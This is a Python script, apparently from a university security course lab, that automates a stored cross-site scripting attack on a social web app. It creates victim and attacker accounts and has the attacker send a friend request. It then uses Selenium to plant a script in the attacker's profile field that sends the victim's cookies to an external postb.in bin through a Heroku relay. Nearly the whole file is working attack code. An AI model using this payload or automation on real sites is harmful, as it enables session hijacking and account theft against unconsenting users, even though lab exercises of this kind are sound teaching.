import time

import fire
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options


def start_driver():
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(options=chrome_options)
    driver.set_page_load_timeout(5)
    driver.set_script_timeout(5)

    return driver


def attack(server: str = 'http://1e20646419f415513131d83be200e0326560be38193c43242109fc7f9223.project.ssof.rnl.tecnico.ulisboa.pt',
           target_url: str = None,
           victim_username: str = 'victim9', victim_password: str = 'victim',
           hacker_username: str = 'hacker9', hacker_password: str = 'hacker',
           field: str = 'nameInput'):

    assert field in {'aboutInput', 'nameInput'}
    # Create postb.in bin
    if target_url is None:
        r = requests.post('https://postb.in/api/bin')
        bin_id = r.json()['binId']
        print(f'Access stolen data at: https://postb.in/b/{bin_id}')

        target_url = f'https://postb.in/{bin_id}'

    victim = {'username': victim_username, 'password': victim_password}
    hacker = {'username': hacker_username, 'password': hacker_password}

    vs = requests.Session()
    vs.post(url=server + '/register', data=victim)
    r = vs.post(url=server + '/login', data=victim)
    if not r.ok:
        raise ValueError(f'Could not login the victim with credentials: {victim}')

    hs = requests.Session()
    hs.post(url=server + '/register', data=hacker)
    r = hs.post(url=server + '/login', data=hacker)
    if not r.ok:
        raise ValueError(f'Could not login the hacker with credentials: {hacker}')

    print(f'Successfully logged in the victim {victim_username} and the hacker {hacker_username}')

    # Hacker makes a friend request to the victim
    print('Hacker sends a friend request to the victim...')
    r = hs.post(url=server + '/request_friend', data={'username': victim['username']})
    assert r.ok

    # Hacker creates a random Public post
    print('Hacker creates a random public post...')
    r = hs.post(url=server + '/create_post', data={'content': 'Some random post', 'type': 'Public'})
    assert r.ok

    steal_cookies = f'''
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://sheltered-plateau-71445.herokuapp.com/{target_url}", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        xhr.send(JSON.stringify({{
            "cookie": document.cookie
        }}));
        //alert("You are under attack!");
    </script>'''

    driver = start_driver()
    # Hacker login
    driver.get(server + '/login')
    driver.find_element_by_id('username').send_keys(hacker['username'])
    driver.find_element_by_id('password').send_keys(hacker['password'])
    driver.find_element_by_class_name('btn-success').click()

    # Update hacker profile with malicious content
    driver.get(server + '/profile')
    driver.find_element_by_id(field).send_keys(steal_cookies.replace('\n', '  '))
    driver.find_element_by_id('currentpasswordInput').send_keys(hacker['password'])
    driver.find_element_by_class_name('btn-primary').click()
    driver.close()

    # The victim opens the pending requests page and the malicious script gets executed
    # Login
    driver = start_driver()
    driver.get(server + '/login')
    driver.find_element_by_id('username').send_keys(victim['username'])
    driver.find_element_by_id('password').send_keys(victim['password'])

    driver.find_element_by_class_name('btn-success').click()
    driver.add_cookie({'name': '_ga', 'value': 'GA1.2.663725531.1598468128'})
    driver.add_cookie({'name': 'mySecretCookie', 'value': 'Tasty'})

    # Open /pending_requests
    if field == 'aboutInput':
        print(f'Field: {field} => Victim is opening pending requests')
        driver.get(server + '/pending_requests')
        time.sleep(2)
        driver.close()
    elif field == 'nameInput':
        print(f'Field: {field} => Victim is opening the main page (or any page that would load the malicious user profile)')
        driver.get(server)
        time.sleep(2)
        driver.close()


if __name__ == '__main__':
    fire.Fire(attack)
